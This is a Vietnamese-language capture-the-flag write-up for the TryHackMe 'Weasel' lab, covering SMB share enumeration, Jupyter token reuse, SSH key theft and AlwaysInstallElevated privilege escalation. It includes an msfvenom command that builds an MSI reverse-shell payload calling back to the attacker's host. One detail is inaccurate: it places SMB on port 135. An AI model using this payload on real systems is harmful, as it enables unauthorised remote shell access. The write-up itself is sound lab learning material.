# **Weasel - Room - TryHackMe**

*Because of my broken english, I wrote this writeup by my mom language*

*Btw, đây là máy window đầu tiên mình làm nên còn nhiều sai xót* 🙄

Mình chạy nmap để xem con máy này mở những port nào và đây là kết quả

```
Nmap scan report for 10.10.175.47 (10.10.175.47)
Host is up (0.40s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b17d88a1e8c99bc5bf53d0a5eff5e5e (RSA)
|   256 3cc0fdb5c157ab75ac8110aee298120d (ECDSA)
|_  256 e9f030bee6cfeffe2d1421a0ac457b70 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-28T16:11:32+00:00
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2023-03-12T11:46:50
|_Not valid after:  2023-09-11T11:46:50
|_ssl-date: 2023-05-28T16:11:49+00:00; +1s from scanner time.
8888/tcp open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
| http-robots.txt: 1 disallowed entry 
|_/ 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-28T16:11:29
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

Nhìn vào kết quả, mình biết được đây là 1 con máy chạy Window, có mở smb và có 1 con web ở port 8888. Mình check trang này thì thấy đây là 1 trang *Jupyter notebook* (Hãy google về cái này để biết thêm thông tin chi tiết nhé).

![check web](/tryhackme/weasel/images/check_web.png)

Có vẻ như mình cần tìm token hoặc password ở đâu đó mới thao tác được với trang web. Do nãy mình dùng nmap để scan, kết quả trả về có smb tại port 135, nên mình đã dùng *smbclient* để check xem có folder nào được share không

![shared folder](/tryhackme/weasel/images/shared_folder.png)

Và có thật, có folder *datasci-team* được share, nên mình đã chọc vào đây xem folder này có những gì, và tìm thấy được token để login vào cái trang web tại port 8888.

![found token](/tryhackme/weasel/images/found_token.png)

Login thôi

![Login web](/tryhackme/weasel/images/login_jupyter.png)

Trông cái thứ trên web và cái thứ tại smb khá giống nhau, nên mình put linh tinh lên cái smb để xem 2 cái này có cùng folder không, nhưng nó lại là không, tức là 2 cái này ở 2 chỗ khác nhau (Nhưng khả năng 2 folder này ở cùng 1 hệ thống)

![check same folder](/tryhackme/weasel/images/check_if_same_folder.png)

Nhưng vì đây là *Jupyter notebook* nên mình đã tạo 1 terminal mới xem có những gì, và đây là 1 hệ thống linux (WSL đấy)

![jupyter terminal](/tryhackme/weasel/images/jupyter_terminal.png)

Mình có thấy có 1 cái key ssh ở đây và có vẻ như user sử dụng key này là *dev-datasci-lowpriv*, mình lấy key này về và thành công ssh vào server với username là *dev-datasci-lowpriv*.

![ssh](/tryhackme/weasel/images/ssh.png)

Không biết vì sao nhưng mình đã tìm thấy powershell trên máy window này và dùng cả *command prompt* lẫn *powershell*. Bằng biện pháp nghiệp vụ, mình đã scan ra được user này có quyền chạy file *msi* dưới quyền Admin (hoặc là NT AUTHORITY\SYSTEM) - nếu mà đối chiếu sang linux thì nó sẽ tương đương với lệnh "sudo -u root ...". Bất kỳ user nào được bật *AlwaysInstallElevated* tại cả 2 chỗ *HKLM* và *HKCU* đều có thể thực hiện được việc thực thi với file msi bằng quyền Admin vậy.

![vuln](/tryhackme/weasel/images/vuln.png)

Bên cạnh đó, máy Window này đã tắt Antivirus

![disabled AV](/tryhackme/weasel/images/Disabled_AV.png)

Mình cũng có tìm thấy được creds của user

![creds](/tryhackme/weasel/images/creds.png)

Mọi thứ đều có trong tay, mình tạo 1 con reverse shell bằng metasploit. (ditme thuat ngu chuyen nganh)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT> -f msi > setup.msi
```

Đẩy lên máy window cái file mình vừa tạo và mình thành công chiếm quyền *Administrator* của máy

![get administrator](/tryhackme/weasel/images/get_administrator.png)

## **Bonus**

Sau một hồi ngồi tìm kiếm, mình thấy máy này có 1 cách nữa là mount máy window tại máy Linux ở Jupyter notebook và lấy được flag (Do Administrator của máy này là phế vật ở máy khác nên mình thoải mái di chuyển trong cái chỗ mình mount). Phần này liên quan đến [Windows Subsystem for Linux](https://stackoverflow.com/questions/45244306/mounting-a-windows-share-in-windows-subsystem-for-linux) nên mình sẽ chỉ để ảnh thôi nhé chứ không viết gì thêm.

![bonus1](/tryhackme/weasel/images/bonus_1.png)

![bonus2](/tryhackme/weasel/images/bonus_2.png)